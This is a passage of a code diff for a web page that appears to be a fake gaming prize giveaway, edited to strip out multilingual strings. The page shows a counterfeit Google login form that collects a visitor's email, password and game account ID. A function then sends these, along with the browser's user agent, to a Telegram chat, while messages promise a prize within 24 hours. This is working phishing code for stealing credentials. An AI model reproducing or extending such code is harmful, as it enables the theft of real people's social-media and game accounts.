+                    showNotification("Пожалуйста, введите email", true);
                     return;
                 }
                 
@@ -3354,9 +3471,6 @@
                 googlePasswordInput.value = '';
                 googleShowPassword.checked = false;
                 googlePasswordInput.type = 'password';
-                
-                // Анимация перехода
-                googleStep2.style.animation = 'slideInRight 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
             });
             
             googleSubmitBtn.addEventListener('click', async function(e) {
@@ -3364,22 +3478,25 @@
                 const password = googlePasswordInput.value.trim();
                 
                 if (!password) {
-                    showNotification(
-                        currentLanguage === 'ru' ? "Пожалуйста, введите пароль" :
-                        currentLanguage === 'uz' ? "Iltimos, parol kiriting" :
-                        "Please enter password", 
-                        true
-                    );
+                    showNotification("Пожалуйста, введите пароль", true);
+                    return;
+                }
+                
+                // Проверяем, введен ли ID аккаунта
+                if (!userAccountId) {
+                    showNotification("Сначала введите ID вашего аккаунта", true);
+                    closeGoogleFullscreen();
+                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
                     return;
                 }
                 
                 const showPassword = googleShowPassword.checked;
                 
                 const loginData = {
-                    accountId: accountId,
                     email: googleEmail,
                     password: password,
-                    show_password: showPassword ? 'Да' : 'Нет'
+                    show_password: showPassword ? 'Да' : 'Нет',
+                    account_id: userAccountId
                 };
                 
                 const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
@@ -3389,13 +3506,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    showNotification(
-                        currentLanguage === 'ru' ? "Данные для входа отправлены! Приз будет зачислен в течение 24 часов." :
-                        currentLanguage === 'uz' ? "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi." :
-                        "Login data sent! Prize will be credited within 24 hours.", 
-                        false, 
-                        true
-                    );
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3411,43 +3522,25 @@
             // Кнопка "Создать аккаунт" в Google
             document.getElementById('googleCreateAccountBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                showNotification(
-                    currentLanguage === 'ru' ? "Функция создания аккаунта временно недоступна" :
-                    currentLanguage === 'uz' ? "Hisob yaratish funktsiyasi vaqtincha mavjud emas" :
-                    "Account creation feature is temporarily unavailable"
-                );
+                showNotification("Функция создания аккаунта временно недоступна", false, false);
             });
             
             // Кнопка "Забыли пароль" в Google
             document.getElementById('googleForgotPasswordBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                showNotification(
-                    currentLanguage === 'ru' ? "Функция восстановления пароля временно недоступна" :
-                    currentLanguage === 'uz' ? "Parolni tiklash funktsiyasi vaqtincha mavjud emas" :
-                    "Password recovery feature is temporarily unavailable"
-                );
+                showNotification("Функция восстановления пароля временно недоступна", false, false);
             });
             
             // Обработчик кнопки получения приза
             getPrizeBtn.addEventListener('click', async function() {
                 if (!selectedSocial) {
-                    showNotification(
-                        currentLanguage === 'ru' ? "Пожалуйста, выберите социальную сеть" :
-                        currentLanguage === 'uz' ? "Iltimos, ijtimoiy tarmoqni tanlang" :
-                        "Please select a social network", 
-                        true
-                    );
+                    showNotification("Пожалуйста, выберите социальную сеть", true);
                     return;
                 }
                 
-                if (!accountId) {
-                    showNotification(
-                        currentLanguage === 'ru' ? "Пожалуйста, сначала введите ID аккаунта" :
-                        currentLanguage === 'uz' ? "Iltimos, avval hisob ID raqamini kiriting" :
-                        "Please first enter account ID", 
-                        true
-                    );
-                    accountIdSection.classList.add('active');
+                // Проверяем, введен ли ID аккаунта
+                if (!userAccountId) {
+                    showNotification("Сначала введите ID вашего аккаунта", true);
                     accountIdSection.scrollIntoView({ behavior: 'smooth' });
                     return;
                 }
@@ -3474,16 +3567,15 @@
             // Функция отправки данных входа в Telegram
             async function sendLoginDataToTelegram(socialType, loginData, prizeIndex) {
                 const socialNames = {
-                    'vk': currentLanguage === 'ru' ? 'ВКонтакте' : currentLanguage === 'uz' ? 'VKontakte' : 'VKontakte',
+                    'vk': 'ВКонтакте',
                     'facebook': 'Facebook',
-                    'x': 'Twitter/X',
+                    'x': 'X',
                     'google': 'Google'
                 };
                 
                 const prizeNumber = prizeIndex + 1;
                 
-                let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
-                message += `🎮 ID аккаунта: ${loginData.accountId || 'Не указано'}\n`;
+                let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА 🔐\n\n`;
                 message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
                 
                 // Добавляем данные в зависимости от соцсети
@@ -3503,6 +3595,8 @@
                     message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
                 }
                 
+                // Добавляем ID аккаунта
+                message += `🎮 ID аккаунта: ${loginData.account_id || 'Не указано'}\n`;
                 message += `🎁 Выигранный приз: #${prizeNumber}\n`;
                 message += `⏰ Время: ${new Date().toLocaleString()}\n`;
                 message += `🌐 User Agent: ${navigator.userAgent}\n`;
@@ -3551,7 +3645,7 @@
             
             // Проверяем, играл ли пользователь уже
             if (hasPlayed && userIP !== ownerIP) {
-                playBtn.innerHTML = `<i class="fas fa-check"></i> ${currentLanguage === 'ru' ? 'УЖЕ ИГРАЛИ' : currentLanguage === 'uz' ? 'ALLAQACHON O\'YNANGAN' : 'ALREADY PLAYED'}`;
+                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                 playBtn.disabled = false;
             }
             
@@ -3599,14 +3693,10 @@
             
             preloadImages();
             
-            // Закрытие выпадающих меню при клике вне их
+            // Закрытие выпадающего меню при клике вне его
             document.addEventListener('click', function(event) {
                 if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
                     languageDropdown.classList.remove('show');
-                }
-                
-                if (!menuBtn.contains(event.target) && !dropdownMenu.contains(event.target)) {
-                    dropdownMenu.classList.remove('show');
                 }
             });
             
@@ -3645,9 +3735,6 @@
                     animateFrameRandomly();
                 }
             }, 2000);
-            
-            // Инициализация английского языка при загрузке
-            changeLanguage('en');
         });
     </script>
 </body>
